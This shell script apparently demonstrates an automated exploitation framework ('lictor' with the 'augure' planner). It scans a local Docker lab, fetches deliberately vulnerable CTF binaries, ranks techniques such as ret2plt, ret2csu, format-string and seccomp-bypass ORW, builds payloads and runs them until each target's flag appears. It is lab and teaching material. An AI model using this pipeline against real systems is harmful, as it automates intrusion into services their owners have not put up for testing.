#!/bin/sh
# The augure/lictor demo: EIGHT targets, eight different fact bases,
# eight different decisions - the decision layer's showcase.
# Run from anywhere: sh lictor/lab/demo.sh
set -e
cd "$(dirname "$0")/.."
ROOT=$(pwd)

WORK=$(mktemp -d)
if [ -d "$ROOT/augure/packs" ]; then
	PACKS="$ROOT/augure/packs"
else
	PACKS="$ROOT/../augure/packs"
fi
printf 'trail: demo-trail.jsonl\npacks: %s\n' "$PACKS" >"$WORK/lictor.yml"

L="$ROOT/bin/lictor"

echo "=== 0. the lab is up (docker compose up -d --build) ==="
docker compose -f lab/docker-compose.yml up -d --build >/dev/null
sleep 1

echo "=== 1. scan (nmap finds the services, recorded in the trail) ==="
(cd "$WORK" && "$L" scan 127.0.0.1) | head -6

# target:port  binary  (the binaries are served over http)
STEP=2
for entry in "127.0.0.1:9999 ret2func" "127.0.0.1:9998 ret2plt" \
	"127.0.0.1:9997 shellcode" "127.0.0.1:9996 fmtstr" "127.0.0.1:9994 orw" \
	"127.0.0.1:9993 callme" "127.0.0.1:9992 ret2csu"; do
	set -- $entry
	TGT=$1
	BIN=$2
	echo
	echo "=== $STEP. target $TGT ($BIN): acquire -> decide -> build -> run ==="
	STEP=$((STEP + 1))

	echo "[acquire] the binary: downloaded, ELF-checked, profiled, recorded"
	SUBDIR=""
	if [ "$BIN" = callme ] || [ "$BIN" = ret2csu ]; then
		# the emporium targets live in their own directories (the http
		# server serves files, not directory listings)
		SUBDIR="emporium/$BIN/"
	fi
	(cd "$WORK" && "$L" acquire "$TGT" --from "http://127.0.0.1:8000/${SUBDIR}$BIN") | head -2

	if [ "$BIN" = fmtstr ]; then
		echo "[decide] the source knowledge the profiler cannot see (printf is not a vuln):"
		(cd "$WORK" && "$L" suggest target.facts 'vuln("fmtstr").
fmtstr_read("true").' -o target.facts) | head -3
	fi
	if [ "$BIN" = ret2plt ]; then
		echo "[decide] the source knowledge the profiler cannot see (the unbounded copy is a memcpy):"
		(cd "$WORK" && "$L" suggest target.facts 'vuln("sof").' -o target.facts) | head -3
	fi
	if [ "$BIN" = callme ] || [ "$BIN" = ret2csu ]; then
		echo "[decide] the source knowledge the profiler cannot see (the unbounded copy is a read):"
		(cd "$WORK" && "$L" suggest target.facts 'vuln("sof").' -o target.facts) | head -3
	fi
	if [ "$BIN" = shellcode ] || [ "$BIN" = orw ]; then
		echo "[harvest] the service announces its own addresses -> leaked_address facts:"
		(cd "$WORK" && "$L" harvest "$TGT" --facts target.facts) | head -3
	fi
	if [ "$BIN" = orw ]; then
		echo "[decide] the source knowledge the profiler cannot see (execve dies under seccomp):"
		(cd "$WORK" && "$L" suggest target.facts 'seccomp("true").' -o target.facts) | head -3
	fi
	echo "[decide] augure reads the facts and ranks the verified techniques:"
	PLAN_OUT=$( (cd "$WORK" && "$L" plan target.facts -s 7) 2>&1)
	echo "$PLAN_OUT" | head -6

	echo "[build] the offset is MEASURED (cyclic pattern under the debugger);"
	echo "[build] the build walks the ranking, the first buildable technique runs:"
	if [ "$BIN" = callme ] || [ "$BIN" = ret2csu ]; then
		# the debugger runs the binary IN the workdir: the companion
		# library must ride beside it (the loader resolves it there)
		echo "[build] the companion library joins the measured binary:"
		(cd "$WORK" && curl -sf "http://127.0.0.1:8000/${SUBDIR}lib$BIN.so" -o "lib$BIN.so")
		LD_LIBRARY_PATH="$WORK${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
		export LD_LIBRARY_PATH
	fi
	rm -f "$WORK/payload.bin"
	BUILD_EXTRA=""
	[ "$BIN" = orw ] && BUILD_EXTRA="--shellcode-path /opt/target/orw.flag"
	RANKED=$(printf '%s\n' "$PLAN_OUT" | sed -n -E 's/^(selected|ranking):[[:space:]]*//p' | tr '>' ' ' | tr -s '[:space:]' ' ')
	RANKED=$(printf '%s\n' $RANKED | awk '!seen[$0]++' | tr '\n' ' ')
	BUILT=""
	for T in $RANKED; do
		if BUILD_OUT=$( (cd "$WORK" && "$L" build "$BIN" --facts target.facts -o payload.bin -s 7 --technique "$T" $BUILD_EXTRA) 2>&1); then
			BUILT=$T
			echo "[build] the first buildable rank: $T"
			echo "$BUILD_OUT" | head -4
			break
		fi
		echo "[build] $T does not build from these facts, next rank"
	done

	echo "[run] the closed loop (the executor discovers the exploit in the repos):"
	echo "[run] the oracle = the target's own flag: success means THIS target's flag"
	FLAG_REGEX=$(sed 's/[][\\.^$*+?(){}|]/\\&/g' "$ROOT/lab/targets/$BIN/flag.txt" | tr -d '\n')
	RUN_ARGS="--executor ronin --max-attempts 2 -s 7 --flag-regex $FLAG_REGEX"
	if [ -n "$BUILT" ]; then
		RUN_ARGS="$RUN_ARGS --technique $BUILT"
		if [ -f "$WORK/payload.bin" ]; then
			RUN_ARGS="$RUN_ARGS --payload payload.bin"
		fi
	fi
	(cd "$WORK" && "$L" run "$TGT" --facts target.facts $RUN_ARGS) | head -6
done

echo
echo "=== 7. the heap target: the facts the PROFILER cannot see come from knowledge ==="
echo "[suggest] vuln(uaf) + tcache + glibc 36 -> the decision shifts:"
(cd "$WORK" && "$L" acquire 127.0.0.1:9995 --from http://127.0.0.1:8000/uaf_heap >/dev/null)
(cd "$WORK" && "$L" suggest target.facts 'vuln("uaf").
allocator("tcache").
glibc_minor(36).
function_pointer_on_heap("true").' -o target.facts) | head -3
(cd "$WORK" && "$L" plan target.facts -s 7) | head -5

echo
echo "=== 8. the auditable engagement report (all eight targets) ==="
(cd "$WORK" && "$L" report) | tail -30

echo
echo "demo done - the trail: $WORK/demo-trail.jsonl"
